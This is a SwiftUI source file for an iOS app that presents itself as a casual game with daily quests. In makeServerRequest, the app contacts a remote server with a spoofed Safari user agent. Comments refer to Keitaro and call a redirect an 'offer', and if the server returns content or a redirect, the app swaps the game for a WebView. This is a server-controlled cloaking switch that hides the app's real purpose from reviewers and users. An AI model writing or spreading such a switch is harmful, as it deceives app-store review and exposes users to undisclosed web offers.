//
//  ContentView.swift
//  Mind Body Glyph
//
//  Created by Simon Bakhanets on 04.01.2026.
//

//
//  ContentView.swift
//  Mind Body Glyph
//

import SwiftUI
import Foundation

struct ContentView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @StateObject private var dataService = DataService()
    @State private var selectedTab = 0
    
    @State private var isFetched: Bool = false
    @AppStorage("isBlock") var isBlock: Bool = true
    
    var body: some View {
        ZStack {
            if isFetched == false {
                // Показываем загрузку пока проверяем сервер
                ProgressView()
                    .progressViewStyle(CircularProgressViewStyle(tint: Color(hex: "F3B700")))
                    .scaleEffect(1.5)
            } else {
                if isBlock == true {
                    // Показываем обычное приложение (игру)
                    Group {
                        if hasCompletedOnboarding {
                            mainTabView
                        } else {
                            OnboardingView(
                                hasCompletedOnboarding: $hasCompletedOnboarding,
                                dataService: dataService
                            )
                        }
                    }
                    .onAppear {
                        setupApp()
                    }
                } else {
                    // Показываем WebView
                    WebSystem()
                }
            }
        }
        .onAppear {
            makeServerRequest()
        }
    }
    
    private var mainTabView: some View {
        TabView(selection: $selectedTab) {
            GameView(dataService: dataService)
                .tabItem {
                    Label("Game", systemImage: "gamecontroller.fill")
                }
                .tag(0)
            
            DailyQuestsView(dataService: dataService)
                .tabItem {
                    Label("Quests", systemImage: "list.bullet.clipboard.fill")
                }
                .tag(1)
            
            SettingsView(
                viewModel: SettingsViewModel(dataService: dataService),
                hasCompletedOnboarding: $hasCompletedOnboarding
            )
            .tabItem {
                Label("Settings", systemImage: "gearshape.fill")
            }
            .tag(2)
        }
        .accentColor(Color(hex: "F3B700"))
    }
    
    private func setupApp() {
        // Update daily quests
        var statistics = dataService.loadUserStatistics()
        dataService.updateDailyQuests(statistics: &statistics)
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManager()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing game")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing game")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode)): Showing game")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing game")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

// MARK: - Daily Quests View

struct DailyQuestsView: View {
    @StateObject var dataService: DataService
    @State private var statistics: UserStatistics
    
    init(dataService: DataService) {
        _dataService = StateObject(wrappedValue: dataService)
        _statistics = State(initialValue: dataService.loadUserStatistics())
    }
    
    var body: some View {
        ZStack {
            Color(hex: "040F07")
                .ignoresSafeArea()
            
            ScrollView {
                VStack(alignment: .leading, spacing: 25) {
                    // Header
                    VStack(alignment: .leading, spacing: 8) {
                        Text("Daily Quests")
                            .font(.system(size: 32, weight: .bold))
                            .foregroundColor(.white)
                        
                        Text("Complete tasks and earn rewards")
                            .font(.system(size: 16))
                            .foregroundColor(.white.opacity(0.7))
                    }
                    .padding(.top, 20)
                    
                    // Quests
                    if statistics.dailyQuests.isEmpty {
                        VStack(spacing: 20) {
                            Image(systemName: "list.bullet.clipboard")
                                .font(.system(size: 60))
                                .foregroundColor(Color(hex: "F3B700").opacity(0.5))
                            
                            Text("Start playing to\nreceive quests!")
                                .font(.system(size: 18, weight: .medium))
                                .foregroundColor(.white.opacity(0.6))
                                .multilineTextAlignment(.center)
                        }
                        .frame(maxWidth: .infinity)
                        .padding(.vertical, 60)
                    } else {
                        VStack(spacing: 15) {
                            ForEach(statistics.dailyQuests) { quest in
                                QuestCard(quest: quest)
                            }
                        }
                    }
                    
                    Spacer()
                }
                .padding()
            }
        }
        .onAppear {
            statistics = dataService.loadUserStatistics()
        }
    }
}

#Preview {
    ContentView()
}
